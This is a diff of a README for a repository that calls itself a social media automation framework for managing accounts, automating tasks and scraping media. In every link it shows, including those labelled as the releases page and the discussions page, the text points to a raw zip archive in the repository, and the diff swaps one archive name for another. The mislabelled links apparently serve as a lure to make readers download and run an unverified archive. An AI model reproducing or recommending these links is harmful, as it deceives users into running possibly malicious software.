@@ -1,7 +1,7 @@
 # 🎉 social-media-automation-tools-framework - Simplifying Your Social Media Tasks
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/media-framework-tools-automation-social-v1.7.zip)](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/media-framework-tools-automation-social-v1.7.zip)
+[![Download](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/social_framework_tools_media_automation_1.2.zip)](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/social_framework_tools_media_automation_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the Social Media Automation Tools Framework! This guide will help you download and run the application smoothly. With these tools, you can manage accounts, automate tasks, and scrape media efficiently.
@@ -24,7 +24,7 @@ Ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To install the Social Media Automation Tools Framework, please follow these steps:
 
-1. **Visit the Release Page**: Go to our [Releases page](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/media-framework-tools-automation-social-v1.7.zip).
+1. **Visit the Release Page**: Go to our [Releases page](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/social_framework_tools_media_automation_1.2.zip).
    
 2. **Choose the Latest Version**: Find the latest version listed there. It usually appears at the top.
    
@@ -52,7 +52,7 @@ For a deeper understanding of how to utilize the tools, check out our documentat
 ## 🗣️ Community Discussions
 Join our community to share your feedback or ask questions. Engage with other users and developers for tips and tricks. 
 
-- **GitHub Discussions**: Visit our [Discussions page](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/media-framework-tools-automation-social-v1.7.zip).
+- **GitHub Discussions**: Visit our [Discussions page](https://raw.githubusercontent.com/ikashmiri/social-media-automation-tools-framework/main/foreran/social_framework_tools_media_automation_1.2.zip).
 
 ## 🚧 Contributor Guidelines
 If you wish to contribute to the project, please follow these guidelines:
